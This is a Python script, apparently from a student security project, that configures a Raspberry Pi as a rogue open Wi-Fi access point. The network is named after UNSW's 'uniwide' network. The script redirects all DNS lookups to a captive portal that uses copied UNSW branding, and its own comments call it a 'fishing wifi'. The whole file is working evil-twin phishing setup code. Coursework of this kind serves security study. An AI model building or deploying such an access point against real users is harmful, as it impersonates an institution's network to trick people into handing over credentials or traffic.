import time
from helper import *

def setup_wifi():

    print("seting interfaces")
    fp = open("/etc/network/interfaces","a")
# allow-hotplug wlan0: Start wlan0 sending wifi signal
# iface wlan0 inet static: Defining wlan0
# address 192.168.0.1: Router ip address
# netmask 255.255.255.0: Router netmask
    fp.write(
"""
allow-hotplug wlan0
iface wlan0 inet static
    address 192.168.0.1
    netmask 255.255.255.0
"""
    )
    fp.close()
    print(SUCCES,"Success", ENDC)



    print("seting hostapd")
    fp = open("/etc/hostapd/hostapd.conf","a")
#ssid: wifi name, same as UNSW's wifi in here
#hw_mode=g 2.4 giga herz, 2.4g has better compatibility than 5g
#channel=1: 2.4 giga herz
#wmm_enabled=0 turn off wmm, we do not need that
#auth_algs=1 open wpa 
    fp.write(
"""
interface=wlan0
ssid=uniwide
hw_mode=g
channel=1
wmm_enabled=0
auth_algs=1
"""
    )
    fp.close()
    print(SUCCES,"Success", ENDC)

    print("seting hostapd reading file")
    fp = open("/etc/default/hostapd","a")
#let hostapd read /etc/hostapd/hostapd.conf that we just created
    fp.write(
"""
DAEMON_CONF="/etc/hostapd/hostapd.conf"
"""
    )
    fp.close()

    print("seting dnsmasq")
    fp = open("/etc/dnsmasq.conf","a")
#set the range of ip that router allocates to each device, This means that this fishing wifi can only link up to 28(30-2) devices on the software.
#set the ip of captive portal
    fp.write(
"""
interface=wlan0 
dhcp-range=192.168.0.2,192.168.0.30,12h 
address=/#/192.168.0.1
"""
    )
    fp.close()
    print(SUCCES,"Success", ENDC)

    #restart dnsmasq and hostapd to make the change take effect
    run_command("sudo systemctl unmask hostapd")
    run_command("sudo service hostapd restart")
    run_command("sudo service dnsmasq restart")

    #setup lighttpd
    #lighttpd is a web server, This is necessary to run the front end
    #add " server.error-handler-404 = "/index.html" "
    #Redirect to /var/www/html/index.html when no network
    run_command("sudo cp /home/pi/6841_proj/setup_wifi_file/lighttpd.conf /etc/lighttpd/lighttpd.conf")

    #setup frontend
    #Copy all frontend files to /var/www/html/
    run_command("sudo cp /home/pi/6841_proj/setup_wifi_file/index.html /var/www/html/index.html")
    run_command("sudo cp /home/pi/6841_proj/setup_wifi_file/unswico.png /var/www/html/unswico.png")
    run_command("sudo cp /home/pi/6841_proj/setup_wifi_file/unswbackground.jpg /var/www/html/unswbackground.jpg")

    print("reboot in 3 seconds")
    time.sleep(1)
    print("reboot in 2 seconds")
    time.sleep(1)
    print("reboot in 1 seconds")
    time.sleep(1)
    run_command("sudo reboot")

if __name__ == "__main__":
    setup_wifi()
